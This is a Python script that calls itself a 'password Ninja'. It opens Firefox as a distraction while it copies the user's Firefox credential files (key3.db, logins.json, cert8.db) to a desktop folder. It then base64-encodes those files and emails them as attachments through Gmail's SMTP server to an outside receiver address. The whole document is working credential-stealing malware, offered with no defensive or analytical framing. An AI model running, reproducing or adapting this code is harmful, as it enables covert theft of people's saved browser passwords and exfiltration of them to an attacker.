'''
This script is what we called a password Ninja script
It opens up users firefox and in the background it grabs some files
with sensitive information in it and send it to our email account
It creates a folder on desktop named PWDNinja and also copies those files there as well
'''
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from smtplib import SMTP

import base64
import os
import shutil



# Line that opens FireFox
os.startfile(r'C:\Program Files (x86)\Mozilla Firefox\firefox.exe')

FF_PROFILE_PATH=os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
PATH_DESKTOP = os.path.join(os.environ['HOMEPATH'], 'Desktop', 'PWDNinja')

#create an empty directory
os.mkdir(PATH_DESKTOP)
dirs = os.listdir( FF_PROFILE_PATH )

# This is to get into default profile directory
for file in dirs:
    file1 = FF_PROFILE_PATH + '\\'+file + '\\key3.db'
    #print(file1)
    file2 = FF_PROFILE_PATH + '\\'+file + '\\logins.json'
    #print(file2)
    file3 = FF_PROFILE_PATH + '\\'+file + '\\cert8.db'
    #print(file3)

shutil.copy2(file1,PATH_DESKTOP)
shutil.copy2(file2,PATH_DESKTOP)
shutil.copy2(file3,PATH_DESKTOP)

#file encodes
fo1 = open(file1,"rb")
filecontent1 = fo1.read()
encodedcontent1 = base64.b64encode(filecontent1)

fo2 = open(file2, "rb")
filecontent2 = fo2.read()
encodedcontent2 = base64.b64encode(filecontent2)

fo3 = open(file3, "rb")
filecontent3 = fo3.read()
encodedcontent3 = base64.b64encode(filecontent3)


msg = MIMEMultipart()
msg['Subject'] = 'Email From password Ninja'
msg['From'] = 'sender@gmail.com' # senders email address goes here
msg['To'] = 'receiver@example.com'	# receivers email address goes here

# That is what u see if dont have an email reader:
msg.preamble = 'Multipart massage.\n'

# This is the textual part:
part = MIMEText("Hello im sending an email from a password Ninja")
msg.attach(part)

# This is the binary part(The Attachment):
part = MIMEApplication(encodedcontent1)
part.add_header('Content-Disposition', 'attachment', filename="key3.db")
msg.attach(part)

part = MIMEApplication(encodedcontent2)
part.add_header('Content-Disposition', 'attachment', filename="logins.json")
msg.attach(part)

part = MIMEApplication(encodedcontent3)
part.add_header('Content-Disposition', 'attachment', filename="cert8.db")
msg.attach(part)

# Create an instance in SMTP server
smtp = SMTP('smtp.gmail.com:587')
# Start the server:
#smtp.ehlo()
smtp.starttls()
smtp.login("sender@gmail.com", "sendersPassword") # senders email and password respectively

# Send the email
smtp.sendmail(msg['From'], msg['To'], msg.as_string())
smtp.quit()

